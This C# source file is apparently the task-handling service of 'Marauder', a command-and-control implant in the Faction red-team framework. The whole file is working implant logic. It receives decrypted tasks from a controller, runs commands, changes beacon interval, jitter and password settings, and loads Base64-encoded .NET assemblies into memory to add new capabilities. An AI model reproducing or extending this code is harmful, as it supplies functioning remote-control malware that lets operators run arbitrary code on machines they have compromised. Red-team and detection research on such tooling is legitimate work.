using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Reflection;
using System.Threading;
using System.Diagnostics;
using Newtonsoft.Json;

using Marauder.Objects;
using Faction.Modules.Dotnet.Common;

namespace Marauder.Services
{
  public class CommandService
  {
    public List<Command> AvailableCommands = new List<Command>();
    public List<Dictionary<string, AgentTask>> RunningTasks = new List<Dictionary<string, AgentTask>>();

    public void TaskWatcher(object sender, DecryptedMessageArgs args)
    {
      foreach (AgentTask agentTask in args.AgentTasks)
      {
        RunningTask runningTask = new RunningTask();
        runningTask.Command = agentTask.Command;
        runningTask.TaskName = agentTask.Name;
        runningTask.Task = new Task(() => ProcessCommand(agentTask), runningTask.CancellationTokenSource.Token);
        runningTask.Task.Start();
        State.RunningTasks.Add(runningTask);
      }
    }

    public CommandService()
    {
      State.CryptoService.OnMessageDecrypted += TaskWatcher;
    }
    
    private TaskResult ProcessCommand(AgentTask agentTask)
    {
      bool success = false;
      bool complete = false;
      string result = "Could not run task";
      List<IOC> iocs = new List<IOC>();
      string type = null;
      string content = null;
      string contentId = null;

      if (agentTask.Action.ToLower() == "run") {
#if DEBUG        
        Logging.Write("CommandService", "Got RUN task");
#endif        

        // Find the command we're looking for
        string taskCommand = agentTask.Command;
        int index = agentTask.Command.IndexOf(" ");
        if (index > 0)
        {
         taskCommand = agentTask.Command.Substring(0, index);
        }
        var command = AvailableCommands.Find(x => x.Name == taskCommand);

        // Run the command
        if (command != null)
        {
          Dictionary<string, string> argsDictionary = new Dictionary<string, string>();

          if (index > 0)
          {
            string taskArgs = agentTask.Command.Substring(index + 1);
            argsDictionary = JsonConvert.DeserializeObject<Dictionary<string, string>>(taskArgs);
          }
          try {
            CommandOutput output = command.Execute(argsDictionary);
            result = output.Message;
            success = output.Success;
            complete = output.Complete;
            iocs = output.IOCs;
            type = output.Type;
            contentId = output.ContentId;
            content = output.Content;
          }
          catch (Exception e){
            result = e.Message;
            success = false;
            complete = true;
          }
        }
        else
        {
          success = false;
          complete = true;
          result = String.Format($"Couldn't find command named: {agentTask.Command}");
        }
      }

      else if (agentTask.Action.ToLower() == "set") {
#if DEBUG        
        Logging.Write("CommandService", $"Got SET task: {agentTask.Command}");
#endif        
        result = "";
        string[] command = agentTask.Command.Split(':');
        switch (command[0].ToLower())
        {
          case "name":
            State.Name = command[1];
            break;
          case "beaconinterval":
            State.Sleep = Int32.Parse(command[1]);
            break;
          case "jitter":
            State.Jitter = float.Parse(command[1]);
            break;
          case "password":
            State.Password = command[1];
            break;
          case "payloadname":
            State.PayloadName = null;
            break;
          case "stagingid":
            State.StagingId = null;
            break;
          case "expirationdate":
            State.ExpirationDate = DateTime.Parse(command[1]);
            break;
          default:
            result = $"No setting matches {command[0]}";
            break;
        }

        complete = true;
        success = true;
        if (String.IsNullOrEmpty(result)) {
          result = String.Format($"Updated {command[0]} to {command[1]}");
        }
      }

      else if (agentTask.Action.ToLower() == "load") {
        string[] commandParts = agentTask.Command.Split(' ');
        string name = commandParts[1];
        byte[] bytes = Convert.FromBase64String(commandParts[2]);
        if (commandParts[0].ToLower() == "module") {
          TaskResult moduleResult  = LoadModule(agentTask.Name, name, bytes);
          State.ResultQueue.Add(moduleResult);
          return moduleResult;
        }
        if (commandParts[0].ToLower() == "transport") {
          // moduleResult = LoadTransport()
        }
      }

      else if (agentTask.Action.ToLower() == "exit") {
        Environment.Exit(0);
      }

      TaskResult taskResult = new TaskResult();
      taskResult.Message = result;
      taskResult.Success = success;
      taskResult.Complete = complete;
      taskResult.TaskName = agentTask.Name;
      taskResult.Type = type;
      taskResult.ContentId = contentId;
      taskResult.Content = content;
      taskResult.IOCs = iocs;
      State.ResultQueue.Add(taskResult);
#if DEBUG      
      Logging.Write("CommandService", String.Format("Returning Results: {0}", result));
#endif      
      return taskResult;
    }

    public TaskResult LoadModule(string taskName, string Name, byte[] bytes)
    {
      bool success;
      string message;
      try
      {
        Assembly assembly = Assembly.Load(bytes);
        Type type = assembly.GetType("Faction.Modules.Dotnet.Initialize");
        MethodInfo method = type.GetMethod("GetCommands");
        object instance = Activator.CreateInstance(type, null);
        var commands = method.Invoke(instance, null);
        AvailableCommands.AddRange((List<Command>)commands);
        success = true;
        message = String.Format("Successfully loaded module {0}", Name);
      }
      catch (Exception e)
      {
        success = false;
        message = e.Message;
      }

      TaskResult taskResult = new TaskResult();
      taskResult.Success = success;
      taskResult.Message = message;
      taskResult.TaskName = taskName;
      return taskResult;
    }


  }
}
